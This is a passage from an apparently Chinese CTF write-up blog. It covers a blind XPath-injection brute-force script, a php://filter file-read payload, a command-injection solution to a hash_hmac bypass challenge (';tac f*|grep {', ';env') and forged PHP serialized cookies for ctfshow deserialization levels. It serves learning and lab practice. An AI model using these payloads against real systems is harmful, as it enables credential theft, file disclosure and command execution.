Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/xml&quot;</span><br>&#125;<br>find =re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)<br><br>strs =<span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br><br><br>flag =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:<br><br>        r = s.post(url=url)<br>        token = find.findall(r.text)<br>        <span class="hljs-comment">#猜测根节点名称</span><br>        payload_1 = <span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br>        <span class="hljs-comment">#猜测子节点名称</span><br>        payload_2 = <span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#猜测accounts的节点</span><br>        payload_3 =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#猜测user节点</span><br>        payload_4 =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#跑用户名和密码</span><br>        payload_username =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        payload_password =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br><br>        <span class="hljs-built_in">print</span>(payload_password)<br>        r = s.post(url=url,headers=head,data=payload_username)<br>        <span class="hljs-built_in">print</span>(r.text)<br><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;非法操作&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;用户名或密码错误!&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">accounts</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>gtfly123<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>e10adc3949ba59abbe56e057f20f883e<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>adm1n<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">accounts</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>登录获得信息，用伪协议进行文件读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=pHp:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.BAse64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure><h2 id="羊城杯-2020-Blackcat"><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h2><p>下载Hei_Mao_Jing_Chang.mp3文件,使用命令strings Hei_Mao_Jing_Chang.mp3查看文件<br>在文末看到一段PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">$clandestine = getenv(&quot;clandestine&quot;);</span><br><span class="hljs-string">if(isset($_POST[&#x27;</span>White-cat-monitor<span class="hljs-string">&#x27;]))</span><br><span class="hljs-string">    $clandestine = hash_hmac(&#x27;</span>sha256<span class="hljs-string">&#x27;, $_POST[&#x27;</span>White-cat-monitor<span class="hljs-string">&#x27;], $clandestine);</span><br><span class="hljs-string">$hh = hash_hmac(&#x27;</span>sha256<span class="hljs-string">&#x27;, $_POST[&#x27;</span>One-ear<span class="hljs-string">&#x27;], $clandestine);</span><br><span class="hljs-string">if($hh !== $_POST[&#x27;</span>Black-Cat-Sheriff<span class="hljs-string">&#x27;])&#123;</span><br><span class="hljs-string">    die(&#x27;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br></code></pre></td></tr></table></figure><p> hash_hmac($algo, $data, $key)：</p><p>当传入的<code>$data</code>为数组时，加密得到的结果固定为<code>NULL</code>；</p><p>让White-cat-monitor的值是一个数组，这样使得clandestine的值为null，</p><p>那么第四行可以看成：$hh &#x3D; hash_hmac(‘sha256’, $_POST[‘One-ear’], null);</p><p>要知道hh的值，我们得知道One-ear的值：由于exec只返回命令执行结果的最后一行内容，我们可以使用；来执行多条命令，然后使用dir来显示文件夹内容，所以 One-ear&#x3D;;dir </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">White-cat-monitor[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp; Black-Cat-Sheriff<span class="hljs-operator">=</span><span class="hljs-number">83</span>a<span class="hljs-number">52</span>f<span class="hljs-number">8</span>ff<span class="hljs-number">4e399417109312</span>e<span class="hljs-number">0539</span><span class="hljs-keyword">c</span><span class="hljs-number">80147</span>b<span class="hljs-number">5514586</span><span class="hljs-keyword">c</span><span class="hljs-number">45</span>a<span class="hljs-number">6</span>caeb<span class="hljs-number">3681</span>ad<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>a<span class="hljs-number">395</span>&amp; One-ear<span class="hljs-operator">=</span><span class="hljs-comment">;dir</span><br></code></pre></td></tr></table></figure><p>“tac f*|grep {” 。它的作用是逆向输出当前目录下以f开头的所有文件的内容，并从内容中查找包含“{”字符的行。“|”表示管道符号，将前一个命令的输出作为参数传递给下一个命令。</p><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Black-Cat-Sheriff<span class="hljs-operator">=</span><span class="hljs-number">269</span>afa<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>d<span class="hljs-number">77e37919</span><span class="hljs-keyword">c</span><span class="hljs-number">94</span>f<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">75</span>a<span class="hljs-number">028819193</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>b<span class="hljs-number">51</span>aee<span class="hljs-number">2</span>d<span class="hljs-number">46222</span>cda<span class="hljs-number">81</span>fe<span class="hljs-number">154538</span>&amp;One-ear<span class="hljs-operator">=</span><span class="hljs-comment">;tac f*|grep \&#123;&amp;White-cat-monitor[]=1</span><br></code></pre></td></tr></table></figure><p>或者直接查看环境变量</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">White-<span class="hljs-keyword">cat</span>-monitor[]=0&amp;Black-<span class="hljs-keyword">Cat</span>-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&amp;<span class="hljs-keyword">One</span>-ear=;env<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buuctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow反序列化</title>
    <link href="/2023/06/04/%E5%88%B7%E9%A2%98/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/06/04/%E5%88%B7%E9%A2%98/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;  <span class="hljs-comment">//让当前isVIP的状态为true,后面的$this-&gt;isVip也会变成true</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();            <span class="hljs-comment">//new一个类，但是没有什么代码可执行的</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>不用传入反序列化的字符<br>直接传入<br><code>?username=xxxxxx&amp;password=xxxxx</code></p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip; <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;    <span class="hljs-comment">//global  全局变量</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <span class="hljs-comment">//会接受一个cookie变量</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;    <span class="hljs-comment">//上面的函数方法</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;                <span class="hljs-comment">//上面的函数方法</span><br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();        <span class="hljs-comment">//上面的函数方法</span><br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为<code>$user = unserialize($_COOKIE[&#39;user&#39;]);</code>和<code>if($user-&gt;login($username,$password))&#123;</code></p><p>需要让反序列后的结果是ctfShowUser的实例化对象。又因为只有$this-&gt;isVip是true才能是flag，所以反序列化的内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>对cookie进行修改，再传入参数</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">cookie：user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>password<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get:</span><br>?username<span class="hljs-operator">=</span>xxxxxx&amp;password<span class="hljs-operator">=</span>xxxxxx<br></code></pre></td></tr></table></figure><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;            <span class="hljs-comment">//这里是进行登录接收</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!==<span class="hljs-variable language_">$this</span>-&gt;password)&#123;      <span class="hljs-comment">//这里不一样</span><br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span 